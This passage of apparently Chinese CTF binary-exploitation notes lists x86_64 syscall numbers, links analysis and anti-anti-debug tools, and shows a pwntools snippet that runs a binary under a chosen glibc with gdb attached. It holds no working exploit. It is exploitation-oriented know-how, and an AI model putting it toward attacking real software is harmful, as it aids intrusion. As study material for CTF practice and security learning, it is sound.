class=\"meta-keyword\">define</span> __NR_lchown 94</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umask 95</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettimeofday 96</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrlimit 97</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrusage 98</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysinfo 99</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_times 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ptrace 101</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid 102</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syslog 103</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid 104</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid 105</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid 106</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid 107</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid 108</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpgid 109</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getppid 110</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgrp 111</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsid 112</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid 113</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid 114</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups 115</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups 116</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid 117</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid 118</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid 119</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid 120</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgid 121</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid 122</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid 123</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsid 124</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capget 125</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capset 126</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigpending 127</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigsuspend 130</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaltstack 131</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utime 132</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknod 133</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uselib 134</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_personality 135</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ustat 136</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs 137</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs 138</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysfs 139</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpriority 140</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpriority 141</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setparam 142</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getparam 143</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setscheduler 144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getscheduler 145</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_max 146</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_min 147</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock 149</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlock 150</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlockall 151</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlockall 152</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vhangup 153</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_modify_ldt 154</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pivot_root 155</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__sysctl 156</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prctl 157</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_arch_prctl 158</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_adjtimex 159</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setrlimit 160</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chroot 161</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync 162</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_acct 163</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_settimeofday 164</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mount 165</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount2 166</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapon 167</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapoff 168</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_reboot 169</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sethostname 170</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setdomainname 171</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_iopl 172</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioperm 173</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_create_module 174</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_init_module 175</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_delete_module 176</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_kernel_syms 177</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_query_module 178</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_quotactl 179</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nfsservctl 180</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpmsg 181</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_putpmsg 182</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_afs_syscall 183</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tuxcall 184</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_security 185</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettid 186</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readahead 187</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setxattr 188</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lsetxattr 189</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsetxattr 190</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getxattr 191</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lgetxattr 192</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fgetxattr 193</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listxattr 194</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_llistxattr 195</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flistxattr 196</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_removexattr 197</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lremovexattr 198</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fremovexattr 199</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tkill 200</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_time 201</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futex 202</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setaffinity 203</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getaffinity 204</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_thread_area 205</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_setup 206</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_destroy 207</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_getevents 208</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_submit 209</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_cancel 210</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_thread_area 211</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lookup_dcookie 212</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create 213</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl_old 214</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait_old 215</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_remap_file_pages 216</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents64 217</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_tid_address 218</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_restart_syscall 219</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semtimedop 220</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64 221</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_create 222</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_settime 223</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_gettime 224</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_getoverrun 225</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_delete 226</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_settime 227</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_gettime 228</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_getres 229</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_nanosleep 230</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit_group 231</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait 232</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl 233</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tgkill 234</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimes 235</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vserver 236</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mbind 237</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_mempolicy 238</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_mempolicy 239</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_open 240</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_unlink 241</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedsend 242</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedreceive 243</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_notify 244</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_getsetattr 245</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_load 246</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitid 247</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_add_key 248</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_request_key 249</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_keyctl 250</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_set 251</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_get 252</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init 253</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_add_watch 254</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_rm_watch 255</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_migrate_pages 256</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_openat 257</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdirat 258</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknodat 259</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchownat 260</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futimesat 261</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_newfstatat 262</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlinkat 263</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat 264</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_linkat 265</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlinkat 266</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlinkat 267</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmodat 268</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_faccessat 269</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pselect6 270</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ppoll 271</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unshare 272</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_robust_list 273</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_robust_list 274</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_splice 275</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tee 276</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync_file_range 277</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vmsplice 278</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_move_pages 279</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimensat 280</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_pwait 281</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd 282</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_create 283</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd 284</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fallocate 285</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_settime 286</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_gettime 287</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept4 288</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd4 289</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd2 290</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create1 291</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup3 292</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe2 293</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init1 294</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv 295</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev 296</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_perf_event_open 298</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmmsg 299</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_init 300</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_mark 301</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prlimit64 302</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_name_to_handle_at 303</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open_by_handle_at 304</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_adjtime 305</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syncfs 306</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmmsg 307</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setns 308</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcpu 309</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_readv 310</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_writev 311</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kcmp 312</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_finit_module 313</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setattr 314</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getattr 315</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat2 316</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_seccomp 317</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrandom 318</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_memfd_create 319</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_file_load 320</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bpf 321</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execveat 322</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_userfaultfd 323</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_membarrier 324</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock2 325</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_copy_file_range 326</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv2 327</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev2 328</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5）tools\"><a href=\"#5）tools\" class=\"headerlink\" title=\"5）tools\"></a>5）tools</h3><h6 id=\"1）seccomp-tools\"><a href=\"#1）seccomp-tools\" class=\"headerlink\" title=\"1）seccomp-tools\"></a>1）seccomp-tools</h6><p><a href=\"https://github.com/david942j/seccomp-tools%E3%80%90%E6%9F%A5%E7%9C%8Bseccomp%E7%A6%81%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%91\">https://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】</a></p>\n<h6 id=\"2）scyllahide\"><a href=\"#2）scyllahide\" class=\"headerlink\" title=\"2）scyllahide\"></a>2）scyllahide</h6><p><a href=\"https://github.com/x64dbg/ScyllaHide\">https://github.com/x64dbg/ScyllaHide</a></p>\n<h6 id=\"3）ollydump\"><a href=\"#3）ollydump\" class=\"headerlink\" title=\"3）ollydump\"></a>3）ollydump</h6><p><a href=\"https://www.52pojie.cn/thread-785387-1-1.html\">https://www.52pojie.cn/thread-785387-1-1.html</a></p>\n<p>elf</p>\n<h6 id=\"4）文件dump内存信息。\"><a href=\"#4）文件dump内存信息。\" class=\"headerlink\" title=\"4）文件dump内存信息。\"></a>4）文件dump内存信息。</h6><p><a href=\"https://blog.csdn.net/qq_36119192/article/details/96474833\">https://blog.csdn.net/qq_36119192/article/details/96474833</a></p>\n<p>![image-20210530174645013](/Users/rin/Library/Application Support/typora-user-images/image-20210530174645013.png)</p>\n<p>unicorn engine</p>\n<h6 id=\"5）capstone\"><a href=\"#5）capstone\" class=\"headerlink\" title=\"5）capstone\"></a>5）capstone</h6><p><a href=\"https://github.com/aquynh/capstone\">https://github.com/aquynh/capstone</a></p>\n<h6 id=\"6）qemu-stastic-x64\"><a href=\"#6）qemu-stastic-x64\" class=\"headerlink\" title=\"6）qemu_stastic_x64\"></a>6）qemu_stastic_x64</h6><p><a href=\"https://github.com/multiarch/qemu-user-static\">https://github.com/multiarch/qemu-user-static</a></p>\n<h6 id=\"7）angr\"><a href=\"#7）angr\" class=\"headerlink\" title=\"7）angr\"></a>7）angr</h6><p><a href=\"https://github.com/angr\">https://github.com/angr</a></p>\n<h3 id=\"6）pwntools组件\"><a href=\"#6）pwntools组件\" class=\"headerlink\" title=\"6）pwntools组件\"></a>6）pwntools组件</h3><h5 id=\"1）pwntools指定glibc版本\"><a href=\"#1）pwntools指定glibc版本\" class=\"headerlink\" title=\"1）pwntools指定glibc版本\"></a>1）pwntools指定glibc版本</h5><h6 id=\"获取不同版本glibc\"><a href=\"#获取不同版本glibc\" class=\"headerlink\" title=\"获取不同版本glibc\"></a>获取不同版本glibc</h6><p><a href=\"https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/\">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/</a></p>\n<p>pwntools加载。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">sh = process([<span class=\"string\">&quot;./lib00/lib/x86_64-linux-gnu/ld-2.31.so&quot;</span>, <span class=\"string\">&quot;./hello&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>:<span class=\"string\">&quot;./lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">pwnlib.gdb.attach(sh)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2）基本模块\"><a href=\"#2）基本模块\" class=\"headerlink\" title=\"2）基本模块\"></a>2）基本模块</h5><h6 id=\"1）asm-shellcraft\"><a href=\"#1）asm-shellcraft\" class=\"headerlink\" title=\"1）asm/shellcraft\"></a>1）asm/shellcraft</h6><p> 